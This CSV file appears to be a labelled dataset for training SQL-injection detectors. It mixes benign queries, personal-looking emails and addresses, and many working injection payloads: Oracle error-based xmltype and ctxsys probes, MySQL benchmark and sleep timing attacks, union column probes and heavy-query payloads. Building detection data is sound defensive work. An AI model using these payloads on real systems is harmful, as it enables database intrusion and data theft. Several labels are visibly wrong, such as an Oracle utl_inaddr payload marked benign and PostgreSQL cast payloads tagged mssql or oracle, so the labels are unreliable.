payload_norm,payload_delex,sqli_type,db_engine,confidence,is_attack
"select * from users WHERE username = ""1%\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""-1254"" and username = ""1 )",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ __STR__ __INT__ ),error_based,oracle,0.95,True
"select * from users WHERE username = ""1\' ) ) ) or username = ""1\' ) as wpmv where 1479 = 1479 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.95,True
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 'gsdq' = 'gsdq","__IDENT__ __IDENT__ ( repeat ( left ( __IDENT__ ( char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( __STR__ = __IDENT__",boolean_blind,postgresql,0.8,True
"SELECT Employees.eat, COUNT ( Orders.fairlyID ) AS interiorFROM ( OrdersINNER JOIN imagine ON Orders.fearID = Employees.thingID )","select __IDENT__ , count ( __IDENT__ ) as __IDENT__ ( __IDENT__ join __IDENT__ on __IDENT__ = __IDENT__ )",benign,generic,1.0,False
"select * from users WHERE username = ""1\' in boolean mode ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) #"" and username = ""1",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __INT__,error_based,oracle,0.95,True
"select * from users where id = 1 or ""]{"" or 1 = 1 -- 1",select * from __IDENT__ where __IDENT__ = __INT__ or __STR__ or __INT__ = __INT__ - - __INT__,boolean_blind,mysql,0.85,True
SELECT * FROM past WHERE shoe NOT LIKE '[cost]%',select * from __IDENT__ where __IDENT__ not like __STR__,benign,generic,1.0,False
1'+ ( select 'vtyw' where 7950 = 7950 order by 1--,__INT__ __STR__ __IDENT__ where __INT__ = __INT__ order by __INT__ - -,boolean_blind,generic,0.5,True
"select * from users WHERE username = ""-9505\' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) or username = ""-9770\' ) ) as ovhh where 7903 = 7903","select * from __IDENT__ where __IDENT__ = "" - __INT__ __STR__ ) ) as __IDENT__ where __INT__ = __INT__",error_based,oracle,0.9,True
SELECT MIN ( honor ) AS flight FROM mad,select min ( __IDENT__ ) as __IDENT__ from __IDENT__,benign,generic,1.0,False
SELECT COUNT ( own ) FROM breeze,select count ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False
"1, ( select ( case when ( 1255 = 8025 ) then 1 else 1255* ( select 1255 from mysql.db ) end ) )","__INT__ , ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ * ( select __INT__ from __IDENT__ ) end ) )",boolean_blind,mysql,0.7,True
"1' ) ) as wves where 2641 = 2641 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #","__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = benchmark ( __INT__ , md5 ( __HEX__ ) ) #",time_blind,mysql,0.9,True
"-6798%"" ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( ""%"" = """,- __INT__ % __STR__ % __STR__,error_based,mssql,0.9,True
"1 ) where 7588 = 7588 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --","__INT__ ) where __INT__ = __INT__ or __INT__ = ( select count ( * ) from __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ ) - -",heavy_query,db2,0.7,True
SELECT * FROM without WHERE lake = 'rough' LIMIT 3,select * from __IDENT__ where __IDENT__ = __STR__ limit __INT__,benign,generic,1.0,False
"select * from users WHERE username = ""-7874 ) ) ) and username = ""1\' ) ) ) and ( ( ( \'cbnc\' like \'cbnc""",select * from __IDENT__ where __IDENT__ = __STR__ __INT__ __STR__ __IDENT__ __STR__ __IDENT__,auth_bypass,generic,0.5,True
SELECT AVG ( clothing ) FROM sign SELECT SUM ( known ),select avg ( __IDENT__ ) from __IDENT__ select sum ( __IDENT__ ),benign,generic,1.0,False
SELECT TOP 50 PERCENT * FROM bone,select top __INT__ __IDENT__ * from __IDENT__,benign,generic,1.0,False
"select * from users WHERE username = ""1%\' ) ) ) or username = ""-5863"" and username = ""1%\' ) )",select * from __IDENT__ where __IDENT__ = __INT__ % \ __STR__ ) ),auth_bypass,generic,0.6,True
"select * from users WHERE username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-4582 ) ) as gvfo where 8885 = 8885 and username = ""-6036 ) ) )",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ - __INT__ ) ) ),error_based,postgresql,0.9,True
1'+ ( select somn where 8636 = 8636 rlike sleep ( 5 ) ) +',__INT__ __STR__,time_blind,mysql,0.7,True
"select * from users WHERE username = ""-1641\' ) ) or username = ""-2733\' ) ) ) and ( ( ( \'btjx\' = \'btjx"" or username = ""1 ) as nbno where 9816 = 9816 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,error_based,oracle,0.95,True
SELECT * FROM impossible WHERE climb = 'include' AND ( sky = 'snow' OR motor = 'gate' ),select * from __IDENT__ where __IDENT__ = __STR__ and ( __IDENT__ = __STR__ or __IDENT__ = __STR__ ),benign,generic,1.0,False
"1"" ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ""pdsy"" like ""pdsy",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,benign,generic,1.0,False
51993302p,__IDENT__,benign,generic,0.9,False
"1"" union all select null,null,null,null,null#","__INT__ union all select null , null , null , null , null",union_based,generic,0.85,True
9.45715E+15,__IDENT__ + __INT__,benign,generic,0.9,False
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ""vfvh"" = ""vfvh","select __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) , __INT__ ) from dual and ( ( __STR__ = __IDENT__",time_blind,oracle,0.9,True
1' where 2661 = 2661,__INT__ where __INT__ = __INT__,boolean_blind,generic,0.5,True
"INSERT INTO seldom ( tomorrow, nearly, scientific ) VALUES ( 'grew', 'vegetable', 'tongue' )","insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",benign,mysql,0.9,False
SELECT * FROM design WHERE smoke BETWEEN 10 AND 20,select * from __IDENT__ where __IDENT__ between __INT__ and __INT__,benign,generic,1.0,False
2.03996E+15,__IDENT__ + __INT__,benign,generic,0.9,False
"-4745"" or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ""nifq"" like ""nifq",- __INT__ __STR__ __IDENT__ __STR__ __IDENT__,heavy_query,firebird,0.7,True
"select * from users WHERE username = ""1"" and ""xyjg"" = ""xyjg"" and username = ""-9564","select * from __IDENT__ where __IDENT__ = __STR__ and __STR__ = __STR__ and __IDENT__ = "" - __INT__",auth_bypass,generic,0.5,True
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type = 'acf-field' AND ( ( wp_posts.post_status = 'publish' ) ) AND wp_posts.post_name = 'field_5f6c881b67715' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1","select __IDENT__ from __IDENT__ where __INT__ = __INT__ and __IDENT__ = __STR__ and ( ( __IDENT__ = __STR__ ) ) and __IDENT__ = __STR__ order by __IDENT__ asc , __IDENT__ asc limit __INT__ , __INT__",benign,mysql,0.9,False
pingshen,__IDENT__,benign,generic,0.9,False
"select * from users WHERE username = ""-4582 ) ) as gvfo where 8885 = 8885 and username = ""-2783%\' ) ) or username = ""1\' ) where 1502 = 1502 or username = ""-7199\'","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ % \ __STR__ ) where __INT__ = __INT__ or __IDENT__ = "" - __INT__",auth_bypass,generic,0.6,True
SELECT option_value FROM wp_options WHERE option_name = '_transient_timeout_doing_cron' LIMIT 1,select __IDENT__ from __IDENT__ where __IDENT__ = __STR__ limit __INT__,benign,mysql,0.9,False
"c/ gallarza, 147","__IDENT__ / __IDENT__ , __INT__",benign,generic,0.9,False
"1%"" ) ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --","__INT__ % "" ) ) ) or char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) = __IDENT__ ( repeat ( left ( __IDENT__ ( char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) - -",time_blind,postgresql,0.7,True
cecchini_polonsky@iurispretor.info,__IDENT__,benign,generic,0.9,False
"select * from users WHERE username = ""-3978 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) -- mtun"" and username = ""1\' and username = ""-3899\' ) where 8152 = 8152",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __INT__ __STR__ ) where __INT__ = __INT__,error_based,oracle,0.95,True
"select * from users WHERE username = ""-6661\' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( \'tbmu\' like \'tbmu"" or username = ""1%\' ) ) )",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __INT__ % __IDENT__ ) ) ),boolean_blind,postgresql,0.9,True
"select * from users WHERE username = ""1\' ) where 1502 = 1502 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""1",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __INT__,boolean_blind,oracle,0.9,True
"select * from users WHERE username = ""1 ) ) and username = ""-2154%\' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and \'%\' = \'""","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ % \ __STR__ % \ __STR__ """,error_based,oracle,0.95,True
mallejac,__IDENT__,benign,generic,0.9,False
"1' ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( 'dgwe' like 'dgwe",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,error_based,mysql,0.9,True
leandro,__IDENT__,benign,generic,0.9,False
"SELECT examineID AS ID, seen AS cabin FROM add","select __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ from __IDENT__",benign,generic,1.0,False
-4542' ) ) order by 1#,- __INT__ ) ) order by __INT__,boolean_blind,generic,0.5,True
congregation@saludyfitness.pm,__IDENT__,benign,generic,0.9,False
"select * from users where username = ""1\' ) ) ) and ( ( ( 'njge' like \'njge""",select * from __IDENT__ where __IDENT__ = __STR__,auth_bypass,generic,0.9,True
SELECT Count ( * ) AS year,select count ( * ) as __IDENT__,benign,mysql,0.9,False
galce,__IDENT__,benign,generic,0.9,False
SELECT MIN ( biggest ) AS mind FROM calm,select min ( __IDENT__ ) as __IDENT__ from __IDENT__,benign,generic,1.0,False
"SELECT * FROM users WHERE username = ""-4262%\' ) ) ) || 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( \'%\' = \'"" AND username = ""1 where 5161 = 5161",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __INT__ where __INT__ = __INT__,boolean_blind,oracle,0.8,True
"select * from users WHERE username = ""-1344 ) as gqgi where 2545 = 2545 or username = ""-6036 ) ) ) and username = ""1 ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 6659 = 6659""",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) ) ) and __IDENT__ = __STR__,error_based,oracle,0.9,True
"select * from users WHERE username = ""1\' ) and username = ""-1985 ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and username = ""1\' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.9,True
ramss,__IDENT__,benign,generic,0.9,False
1 where 3802 = 3802 and 2006 = 2006,__INT__ where __INT__ = __INT__ and __INT__ = __INT__,boolean_blind,generic,0.8,True
"select * from users WHERE username = ""-1889%\' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and username = ""1%"" and ""%"" = """"","select * from __IDENT__ where __IDENT__ = __STR__ __INT__ % __STR__ % __STR__ """,boolean_blind,oracle,0.8,True
38673697w,__IDENT__,benign,generic,0.9,False
tosigoso,__IDENT__,benign,generic,0.9,False
"select * from users WHERE username = ""1\' in boolean mode ) and username = ""-6203\' ) ) ) and ( ( ( \'luee\' = \'luee""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.8,True
"select * from users WHERE username = ""-2154%\' and username = ""-1889%\' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) or username = ""1\'|| ( select \'ylio\' from dual where 3767 = 3767 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||\'""","select * from __IDENT__ where __IDENT__ = __STR__ __INT__ __STR__ __IDENT__ __STR__ """,error_based,oracle,0.9,True
SELECT * FROM sit WHERE NOT chose = 'newspaper',select * from __IDENT__ where not __IDENT__ = __STR__,benign,generic,1.0,False
"select * from users WHERE username = ""-1639 ) ) or username = ""1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'""","select * from __IDENT__ where __IDENT__ = __STR__ __INT__ __STR__ __IDENT__ __STR__ """,error_based,oracle,0.9,True
SELECT MIN ( fed ) AS hidden FROM receive,select min ( __IDENT__ ) as __IDENT__ from __IDENT__,benign,generic,1.0,False
nardi borgua,__IDENT__ __IDENT__,benign,generic,0.9,False
"select * from users WHERE username = ""-4582 ) ) as gvfo where 8885 = 8885 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""1%\' ) ) ) and ( ( ( \'%\' = \'""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,error_based,oracle,0.9,True
-6095' ) or 6872 = 6872 and ( 'bfwm' like 'bfwm,- __INT__ __STR__ __IDENT__ __STR__ __IDENT__,boolean_blind,generic,0.8,True
"select * from users WHERE username = ""-8057\' ) ) as gpue where 4205 = 4205 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-5863"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ or __INT__ = cast ( ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) __IDENT__ | | ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) as __IDENT__ ) - - """,error_based,oracle,0.9,True
stiefel8@spainbareback.eu,__IDENT__,benign,generic,0.9,False
SELECT * FROM harder WHERE spite = 'safety',select * from __IDENT__ where __IDENT__ = __STR__,benign,generic,1.0,False
"calle nueva de arriba, 111 9g","__IDENT__ __IDENT__ __IDENT__ __IDENT__ , __INT__ __IDENT__",benign,generic,0.9,False
"select * from users WHERE username = ""-6203\' ) ) ) or username = ""1%\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'%\' = \'""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.9,True
SELECT widely ( s ) FROM lonely FULL OUTER JOIN,select __IDENT__ ( __IDENT__ ) from __IDENT__ full outer join,benign,generic,1.0,False
"select * from users WHERE username = ""-7746\' ) ) ) || 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""-1985 ) ) ) or username = ""-9564 and username = ""-6190\' ) where 2621 = 2621","select * from __IDENT__ where __IDENT__ = "" - __INT__ __STR__ ) where __INT__ = __INT__",error_based,oracle,0.95,True
"1%"" and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ""%"" = """,__INT__ % __STR__ % __STR__,heavy_query,postgresql,0.7,True
"select * from users WHERE username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616 or username = ""-1985 ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 1248 = 1248""",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) ) ) or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) and ( ( ( __INT__ = __INT__,error_based,oracle,0.95,True
